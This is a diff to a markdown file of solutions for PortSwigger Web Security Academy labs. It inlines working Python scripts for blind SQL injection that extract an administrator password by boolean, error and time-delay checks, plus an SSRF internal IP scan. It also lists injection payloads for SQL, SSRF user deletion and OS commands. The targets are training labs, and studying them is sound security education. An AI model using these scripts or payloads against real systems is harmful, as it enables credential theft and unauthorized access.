@@ -1,4 +1,6 @@
-# Portswigger
+# Web Security Academy solutions
+https://portswigger.net/web-security
+
 ## Contents
 
 - [SQLi](#sqli)
@@ -50,10 +52,60 @@
 - `/filter?category='+union+select+USERNAME\_NREBWP,PASSWORD\_TKLBZQ+from+USERS\_QCHNKE--`
 
 #### Blind SQL injection with conditional responses
-Wrote a [script](sqli/sqli-blind-boolean-response.py) to compare substring and check reponse text.
+Wrote a script to compare substring and check reponse text.
+
+```python
+import string
+import requests
+
+uid = 'ac751fda1f68ed5880244a8b00b300bb'
+url = 'https://' + uid + '.web-security-academy.net/filter?category='
+
+# POSTGRESQL
+# SUBSTRING(str, pos, len)
+# cookies = {'TrackingId':"QXEw7ba7drmk8bb9' UNION SELECT version()--;"}
+
+k = ''
+
+for j in range(1,50):
+    for i in string.printable:
+        payload = "' UNION SELECT password FROM users WHERE username='administrator' AND SUBSTRING(password,1,"+str(j)+")='"+(k+i)+"'--"
+        cookies = {'TrackingId':'xyz' + payload}
+        r = requests.get(url, cookies=cookies)
+        if 'Welcome back!' in r.text:
+            k += i
+            print(k)
+            break
+
+# l8we30kf7sp3t16i04co
+```
 
 #### Blind SQL injection with conditional errors ⭐
-Similar script as conditional responses over [here](sqli/sqli-blind-boolean-error.py).
+Similar to conditional responses.
+
+```python
+import string
+import requests
+
+uid = 'ac871f601e7effe9807ad5e0004e008a'
+url = 'https://' + uid + '.web-security-academy.net/filter?category=asdf'
+
+# oracle db
+# no error if no rows returned
+# first find length of password
+# pwd: uney5hpoi974385dhpdp
+
+pwd = ''
+
+for j in range(1,50):
+    for i in string.printable:
+        cookies = {'TrackingId':"xyz' union select case when (username='administrator' and substr(password,1,"+str(j)+") = '"+(pwd+i)+"') then to_char(1/0) else null end from users--"}
+        response = requests.get(url,cookies=cookies)
+        if 'Error' in response.text:
+            pwd += i
+            print(pwd)
+            break;
+```
 
 #### Blind SQL injection with time delays ⭐
 Doesn't work:
@@ -64,7 +116,29 @@ Intended solution:
 `Cookie: TrackingId=' || pg_sleep(10)--;`
 
 #### Blind SQL injection with time delays and information retrieval
-Take a look at [this](sqli/sqli-bind-time.py) script.
+
+```python
+import time
+import string
+import requests
+
+uid = 'ac701f261e608c7180d738b8001800f5'
+url = 'https://' + uid + '.web-security-academy.net/filter?category=asdf'
+pwn = '' # 09tcmzjn1trwj0m2y7gs
+
+for j in range(1,100):
+    for i in string.printable:
+        cookies = {"TrackingId":"x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1," + str(j) + ")='" + (pwn+i) + "')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"}
+
+        start = int(time.time())
+        resp = requests.get(url, cookies=cookies)
+        end = int(time.time())
+
+        if end - start >= 10:
+            pwn += i
+            print(pwn)
+            break
+```
 
 #### Blind SQL injection with out-of-band interaction
 Requires Burp Suite Professional.
@@ -342,10 +416,24 @@ document.getElementById("myForm").submit();
 - Then `stockApi=http://localhost/admin/delete?username=carlos`
 
 #### Basic SSRF against another back-end system
+First run this script to get the IP of the backend system.
 
-- First run [this](ssrf/ssrf-ipscan.py) script to get the IP of the backend system.
-- Then change the request parameter as follows: `stockApi=http://192.168.0.203:8080/admin`
-- Finally to delete a user: `stockApi=http://192.168.0.203:8080/admin/delete?username=carlos`
+```python
+import requests
+
+uid = 'ac701fa31f5c386580184a1500cc00a6'
+url = 'https://' + uid + '.web-security-academy.net/product/stock'
+
+for i in range(2,256):
+    data = {'stockApi':'http://192.168.0.'+str(i)+':8080/admin'}
+    response = requests.post(url,data=data)
+
+    print(i)
+    if 'Could not connect to external stock check service' not in response.text: break;
+```
+Then change the request parameter as follows: `stockApi=http://192.168.0.203:8080/admin`
+
+Finally to delete a user: `stockApi=http://192.168.0.203:8080/admin/delete?username=carlos`
 
 #### SSRF with blacklist-based input filter
 
@@ -353,7 +441,6 @@ document.getElementById("myForm").submit();
 - To delete: `stockApi=http://127.1/adMin/delete?username=carlos`
 
 ## OS Command Injection
-
 #### OS command injection, simple case
 
 `productId=1&storeId=|whomai`
